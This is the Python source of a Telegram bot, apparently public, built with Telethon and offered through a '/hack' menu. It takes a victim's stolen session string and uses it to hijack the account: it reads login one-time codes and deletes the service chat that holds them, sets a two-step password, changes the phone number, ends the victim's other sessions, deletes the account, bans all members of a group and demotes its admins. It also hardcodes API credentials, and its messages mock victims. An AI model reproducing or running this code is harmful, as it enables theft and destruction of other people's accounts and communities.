# COPYRIGHT © 2021-22 BY LEGENDX22 🔥
# NOW PUBLIC BY LEGENDX
import os
os.system("pip install Telethon==1.21.1")
from telethon import TelegramClient, events, functions, types
api_id = os.environ.get("APP_ID")
import os, asyncio
from os import system
from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
api_hash = os.environ.get("API_HASH")
token = os.environ.get("BOT_TOKEN")
client = TelegramClient('Xarmy', api_id, api_hash).start(bot_token=token)
from telethon import TelegramClient as tg
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
from telethon.sessions import StringSession as ses
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
import telethon;from telethon import functions
from telethon.tl.types import ChannelParticipantsAdmins as cpa

from telethon.tl.functions.channels import CreateChannelRequest as ccr
mybot = "missrose_bot"
bot = borg = client

legendx = 1967548493


async def change_number_code(strses, number, code, otp):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    bot = client = X
    try: 
      result = await bot(functions.account.ChangePhoneRequest(
        phone_number=number,
        phone_code_hash=code,
        phone_code=otp
      ))
      return True
    except:
      return False

async def change_number(strses, number):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    bot = client = X
    result = await bot(functions.account.SendChangePhoneCodeRequest(
        phone_number=number,
        settings=types.CodeSettings(
            allow_flashcall=True,
            current_number=True,
            allow_app_hash=True
        )
    ))
    return str(result)


async def userinfo(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    k = await X.get_me()
    return str(k)

async def terminate(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(rt())
GROUP_LIST = []
async def delacc(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(functions.account.DeleteAccountRequest("me hi chutia hu"))

async def promote(strses, grp, user):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    try:
      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
    except:
      await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
    
async def user2fa(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    try:
      await X.edit_2fa('LEGENDXISBEST')
      return True
    except:
      return False

async def demall(strses, grp):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
      try:
        await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
      except:
        await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
      


async def joingroup(strses, username):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(join(username))

async def leavegroup(strses, username):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(leave(username))

async def delgroup(strses, username):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(dc(username))
    

async def cu(strses):
  try:
    async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
        k = await X.get_me()
        return [str(k.first_name), str(k.username or k.id)]
  except Exception as e:
    return False

async def usermsgs(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    i = ""
    async for x in X.iter_messages(777000, limit=3):
      i += f"\n{x.text}\n"
    await client.delete_dialog(777000)
    return str(i)


async def userbans(strses, grp):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    k = await X.get_participants(grp)
    for x in k:
      try:
        await X.edit_permissions(grp, x.id, view_messages=False)
      except:
        pass
    


async def userchannels(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    k = await X(pc())
    i = ""
    for x in k.chats:
      try:
        i += f'\nCHANNEL NAME {x.title} CHANNEL USRNAME @{x.username}\n'
      except:
        pass
    return str(i)



import logging
logging.basicConfig(level=logging.WARNING)

channel = "TheXArmy"
menu = '''

**ɴᴏᴛɪᴄᴇ ᴊᴏɪɴ** [**ᴛʜᴇ ᴀʀᴄ ɴᴇᴛᴡᴏʀᴋ**](https://t.me/the_arc_network)


A: [ᴄʜᴇᴄᴋ ᴜsᴇʀ's ᴏᴡɴ ɢʀᴏᴜᴘs ᴀɴᴅ ᴄʜᴀɴɴᴇʟs]

B: [ᴄʜᴇᴄᴋ ᴜsᴇʀ's ᴀʟʟ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ʟɪᴋᴇ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴀɴᴅ ᴜsʀɴᴀᴍᴇ...]

C: [ʙᴀɴ ᴀ ɢʀᴏᴜᴘ {ɢɪᴠᴇ ᴍᴇ 𝕊𝕥𝕣𝕚𝕟𝕘𝕊𝕖𝕤𝕤𝕚𝕠𝕟 ᴀɴᴅ ᴄʜᴀɴɴᴇʟ/ɢʀᴏᴜᴘ ᴜsᴇʀɴᴀᴍᴇ ɪ ᴡɪʟʟ ʙᴀɴ ᴀʟʟ ᴍᴇᴍʙᴇʀs ᴛʜᴇʀᴇ}]

D: [ᴋɴᴏᴡ ᴜsᴇʀ's ʟᴀsᴛ ᴏᴛᴘ {1 sᴛ ᴜsᴇ ᴏᴘᴛɪᴏɴ ʙ ᴛᴀᴋᴇ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴀɴᴅ ʟᴏɢɪɴ ᴛʜᴇʀᴇ ᴀᴄᴄᴏᴜɴᴛ ᴛʜᴇɴ ᴜsᴇ ᴍᴇ ɪ ᴡɪʟʟ ɢɪᴠᴇ ʏᴏᴜ ᴏᴛᴘ}][2 sᴛᴇᴘ ʜᴜᴀ ᴛʜᴏ ʙʏᴇ ʙʏᴇ ᴛᴀᴛᴀ ᴋʜᴀᴛᴀᴍ 😂]

E: [ᴊᴏɪɴ ᴀ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ᴠɪᴀ sᴛʀɪɴɢsᴇssɪᴏɴ]

F: [ʟᴇᴀᴠᴇ ᴀ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ᴠɪᴀ sᴛʀɪɴɢsᴇssɪᴏɴ]

G: [ᴅᴇʟᴇᴛᴇ ᴀ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ]

H: [ᴄʜᴇᴄᴋ ᴡʜᴇᴛʜᴇʀ ᴜsᴇʀ's ᴛᴡᴏ sᴛᴇᴘ ɪs ᴇɴᴀʙʟᴇᴅ ᴏʀ ᴅɪsᴀʙʟᴇᴅ]

I: [ᴛᴇʀᴍɪɴᴀᴛᴇ ᴀʟʟ ᴄᴜʀʀᴇɴᴛ ᴀᴄᴛɪᴠᴇ sᴇssɪᴏɴs ᴇxᴄᴇᴘᴛ ʏᴏᴜʀ sᴛʀɪɴɢsᴇssɪᴏɴ ]

J: [ᴅᴇʟᴇᴛᴇ ᴀᴄᴄᴏᴜɴᴛ]

K: [ᴅᴇᴍᴏᴛᴇ ᴀʟʟ ᴀᴅᴍɪɴs ɪɴ ᴀ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ]

L: [ᴘʀᴏᴍᴏᴛᴇ ᴀ ᴍᴇᴍʙᴇʀ ɪɴ ᴀ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ]

M: [ᴄʜᴀɴɢᴇ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴜsɪɴɢ sᴛʀɪɴɢsᴇssɪᴏɴ]

ᴡᴇ sʜᴀʟʟ ᴀᴅᴅ ᴍᴏʀᴇ ғᴇᴀᴛᴜʀᴇs ʟᴀᴛᴇʀ.
'''
mm = '''
ɪɴᴛʀᴏᴅᴜᴄᴛɪᴏɴ ᴋɪ ᴢᴀʀᴜʀᴀᴛ ɴᴀʜɪ ʜᴀɪ \n ᴛʏᴘᴇ /hack
'''
@client.on(events.NewMessage(pattern="/start"))
async def op(event):
  global mm
  if not event.is_private:
    await event.reply("ʙsᴅᴋ ᴘᴍ ᴍᴀɪ ᴍᴇssᴀɢᴇ ᴋʀ")
  else:
    await event.reply(mm)
@client.on(events.NewMessage(pattern="/give"))
async def op(event):
  if not event.sender_id == legendx:
    return await event.reply("please don't use me fuck off 🥺")
  try:
    await event.reply("session bot file", file="Xarmy.session")
  except Exception as e:
    print (e)


@client.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
async def op(event):
  await event.reply("ʙsᴅᴋ ᴘᴍ ᴍᴀɪ ᴍᴇssᴀɢᴇ ᴋʀ")
@client.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
async def start(event):
  global menu
  async with bot.conversation(event.chat_id) as x:
    await x.send_message(f"ᴄʜᴏᴏsᴇ ᴡʜᴀᴛ ʏᴏᴜ ᴡᴀɴᴛ ᴡɪᴛʜ sᴛʀɪɴɢ sᴇssɪᴏɴ 🤤 \n\n{menu}")
    res = await x.get_response()
    r = res.text
    if res.text == "A":
      await x.send_message("⚠️ ɢɪᴠᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ⚠️")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("**ᴛʜɪs sᴛʀɪɴɢsᴇssɪᴏɴ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴍᴀʏʙᴇ. ᴋᴀᴛ ɢʏᴀ 😂**")
      try:
        i = await userchannels(strses.text)
      except:
        return await event.reply("**ᴛʜɪs sᴛʀɪɴɢsᴇssɪᴏɴ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴍᴀʏʙᴇ. ᴋᴀᴛ ɢʏᴀ 😂**")
      if len(i) > 3855:
        file = open("session.txt", "w")
        file.write(i + "\n\ᴅᴇᴛᴀɪʟs ʙʏ [ᴛʜᴇ ᴀʀᴄ ɴᴇᴛᴡᴏʀᴋ](https://t.me/the_arc_network)")
        file.close()
        await bot.send_file(event.chat_id, "session.txt")
        system("rm -rf session.txt")
      else:
        await event.reply(i + "\n\ɴ ᴋᴀᴛ ᴅɪʏᴀ ʙɪᴄʜᴀʀᴇ ᴋᴀ 😂 \n ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ [ᴀʀᴄ ʙᴏᴛ](https://t.me/the_arc_network)")
    elif res.text == "B":
      await x.send_message("⚠️ ɢɪᴠᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ⚠️")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ᴛʜɪs sᴛʀɪɴɢsᴇssɪᴏɴ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴍᴀʏʙᴇ. ᴋᴀᴛ ɢʏᴀ 😂")
      i = await userinfo(strses.text)
      await event.reply(i + "\n\nᴋᴀᴛ ᴅɪʏᴀ ʙɪᴄʜᴀʀᴇ ᴋᴀ 😂 \n ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ [ᴀʀᴄ ʙᴏᴛ](https://t.me/the_arc_network)")
    elif r == "C":
      await x.send_message("⚠️ ɢɪᴠᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ⚠️")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("**ᴛʜɪs sᴛʀɪɴɢsᴇssɪᴏɴ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴍᴀʏʙᴇ. ᴋᴀᴛ ɢʏᴀ 😂**")
      await x.send_message("ɢɪᴠᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ/ɪᴅ")
      grpid = await x.get_response()
      await userbans(strses.text, grpid.text)
      await event.reply("ʙᴀɴɴɪɴɢ ᴀʟʟ ᴍᴇᴍʙᴇʀs")
    elif r == "D":
      await x.send_message("⚠️ ɢɪᴠᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ⚠️")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("**ᴛʜɪs sᴛʀɪɴɢsᴇssɪᴏɴ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴍᴀʏʙᴇ. ᴋᴀᴛ ɢʏᴀ 😂**")
      i = await usermsgs(strses.text)
      await event.reply(i + "\n\nᴋᴀᴛ ᴅɪʏᴀ ʙɪᴄʜᴀʀᴇ ᴋᴀ 😂 \n ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ [ᴀʀᴄ ʙᴏᴛ](https://t.me/the_arc_network)")
    elif r == "E":
      await x.send_message("⚠️ ɢɪᴠᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ⚠️")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("**ᴛʜɪs sᴛʀɪɴɢsᴇssɪᴏɴ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴍᴀʏʙᴇ. ᴋᴀᴛ ɢʏᴀ 😂**")
      await x.send_message("ɢɪᴠᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ/ɪᴅ")
      grpid = await x.get_response()
      await joingroup(strses.text, grpid.text)
      await event.reply("ᴊᴏɪɴᴇᴅ ᴛʜᴇ ᴄʜᴀɴɴᴇʟ/ɢʀᴏᴜᴘ.")
    elif r == "F":
      await x.send_message("⚠️ ɢɪᴠᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ⚠️")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("**ᴛʜɪs sᴛʀɪɴɢsᴇssɪᴏɴ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴍᴀʏʙᴇ. ᴋᴀᴛ ɢʏᴀ 😂**")
      await x.send_message("ɢɪᴠᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ/ɪᴅ")
      grpid = await x.get_response()
      await leavegroup(strses.text, grpid.text)
      await event.reply("ʟᴇᴀᴠᴇᴅ ᴛʜᴇ ᴄʜᴀɴɴᴇʟ/ɢʀᴏᴜᴘ.")
    elif r == "G":
      await x.send_message("⚠️ ɢɪᴠᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ⚠️")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("This StringSession is terminated maybe")
      await x.send_message("ɢɪᴠᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ/ɪᴅ")
      grpid = await x.get_response()
      await delgroup(strses.text, grpid.text)
      await event.reply("ᴅᴇʟᴇᴛᴇᴅ ᴛʜᴇ ᴄʜᴀɴɴᴇʟ/ɢʀᴏᴜᴘ.")
    elif r == "H":
      await x.send_message("⚠️ ɢɪᴠᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ⚠️")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("**ᴛʜɪs sᴛʀɪɴɢsᴇssɪᴏɴ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴍᴀʏʙᴇ. ᴋᴀᴛ ɢʏᴀ 😂**")
      i = await user2fa(strses.text)
      if i:
        await event.reply("ᴜsᴇʀ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ, ʏᴏᴜ ᴄᴀɴ ʟᴏɢɪɴ ᴀɴᴅ ʀᴇᴀᴅ ᴄʜᴀᴛs 😈")
      else:
        await event.reply("sᴏʀʀʏ ᴜsᴇʀ ʜᴀᴠᴇ ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ sᴇᴅ.")
    elif r == "I":
      await x.send_message("⚠️ ɢɪᴠᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ⚠️")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("**ᴛʜɪs sᴛʀɪɴɢsᴇssɪᴏɴ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴍᴀʏʙᴇ. ᴋᴀᴛ ɢʏᴀ 😂**")
      i = await terminate(strses.text)
      await event.reply("ᴀʟʟ sᴇssɪᴏɴs ᴀʀᴇ ᴛᴇʀᴍɪɴᴀᴛᴇᴅ.")
    elif res.text == "J":
      await x.send_message("⚠️ ɢɪᴠᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ⚠️")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("**ᴛʜɪs sᴛʀɪɴɢsᴇssɪᴏɴ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴍᴀʏʙᴇ. ᴋᴀᴛ ɢʏᴀ 😂**")
      i = await delacc(strses.text)
      await event.reply("ᴀᴄᴄᴏᴜɴᴛ ᴡᴀs ᴅᴇʟᴇᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ.")
    elif res.text == "L":
      await x.send_message("⚠️ ɢɪᴠᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ⚠️")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("**ᴛʜɪs sᴛʀɪɴɢsᴇssɪᴏɴ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴍᴀʏʙᴇ. ᴋᴀᴛ ɢʏᴀ 😂**")
      await x.send_message("ɴᴏᴡ ɢɪᴠᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ")
      grp = await x.get_response()
      await x.send_message("ɴᴏᴡ ɢɪᴠᴇ ᴜsᴇʀɴᴀᴍᴇ")
      user = await x.get_response()
      i = await promote(strses.text, grp.text, user.text)
      await event.reply("ɪ ᴀᴍ ᴘʀᴏᴍᴏᴛɪɴɢ ʏᴏᴜ ɪɴ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ᴡᴀɪᴛ ᴀ ᴍɪɴ")
    elif res.text == "K":
      await x.send_message("⚠️ ɢɪᴠᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ⚠️")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("**ᴛʜɪs sᴛʀɪɴɢsᴇssɪᴏɴ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴍᴀʏʙᴇ. ᴋᴀᴛ ɢʏᴀ 😂**")
      await x.send_message("ɴᴏᴡ ɢɪᴠᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ")
      pro = await x.get_response()
      try:
        i = await demall(strses.text, pro.text)
      except:
        pass
      await event.reply("ɪ ᴀᴍ ᴅᴇᴍᴏᴛɪɴɢ ᴀʟʟ ᴍᴇᴍʙᴇʀs ᴏғ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ᴡᴀɪᴛ ᴀ ᴍɪɴ 😈")
    elif res.text == "M":
      await x.send_message("⚠️ ɢɪᴠᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ⚠️")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("**ᴛʜɪs sᴛʀɪɴɢsᴇssɪᴏɴ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴍᴀʏʙᴇ. ᴋᴀᴛ ɢʏᴀ 😂**")
      await x.send_message("ɢɪᴠᴇ ɴᴜᴍʙᴇʀ ᴡʜɪᴄʜ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴄʜᴀɴɢᴇ\n[ɴᴏᴛᴇ: ᴅᴏɴᴛ ᴜsᴇ 2ɴᴅʟɪɴᴇ ᴏʀ ᴛᴇxᴛɴᴏᴡ ɴᴜᴍʙᴇʀs]\n[ɪғ ʏᴏᴜ ᴀʀᴇ ᴜsᴇ 2ɴᴅ ʟɪɴᴇ ᴏʀ ᴛᴇxᴛ ɴᴏᴡ ʏᴏᴜ ᴄᴀɴ'ᴛ ɢᴇᴛ ᴏᴛᴘ ᴜɴʟᴇss ʏᴏᴜ ʜᴀᴠᴇ ᴍᴏɴᴇʏ.] ")
      number = (await x.get_response()).text
      try:
        result = await change_number(strses.text, number)
        await event.respond(result + "\n ᴄᴏᴘʏ ᴛʜᴇ ᴘʜᴏɴᴇ ᴄᴏᴅᴇ ʜᴀsʜ ᴀɴᴅ ᴄʜᴇᴄᴋ ʏᴏᴜʀ ɴᴜᴍʙᴇʀ ʏᴏᴜ ɢᴏᴛ ᴏᴛᴘ\nɪ sᴛᴏᴘ ғᴏʀ 20 sᴇᴄ ᴄᴏᴘʏ ᴘʜᴏɴᴇ ᴄᴏᴅᴇ ʜᴀsʜ ᴀɴᴅ ᴏᴛᴘ")
        await asyncio.sleep(20)
        await x.send_message("ɴᴏᴡ ɢɪᴠᴇ ᴘʜᴏɴᴇ ᴄᴏᴅᴇ ʜᴀsʜ")
        phone_code_hash = (await x.get_response()).text
        await x.send_message("ɴᴏᴡ ɢɪᴠᴇ ᴛʜᴇ ᴏᴛᴘ")
        otp = (await x.get_response()).text
        changing = await change_number_code(strses.text, number, phone_code_hash, otp)
        if changing:
          await event.respond("ᴄᴏɴɢʀᴀᴛᴜʟᴀᴛɪᴏɴs ɴᴜᴍʙᴇʀ ᴡᴀs ᴄʜᴀɴɢᴇᴅ 😈")
        else:
          await event.respond("sᴏᴍᴇᴛʜɪɴɢ ɪs ᴡʀᴏɴɢ")
      except Exception as e:
        await event.respond("sᴇɴᴅ ᴛʜɪs ᴇʀʀᴏʀ ᴛᴏ - @The_Arc_Support \n**LOGS**\n" + str(e))

    else:
      await event.respond("ᴡʀᴏɴɢ ᴛᴇxᴛ ғᴏᴜɴᴅ ʀᴇ-ᴛʏᴘᴇ /hack ᴀɴᴅ ᴜsᴇ")





client.run_until_disconnected()
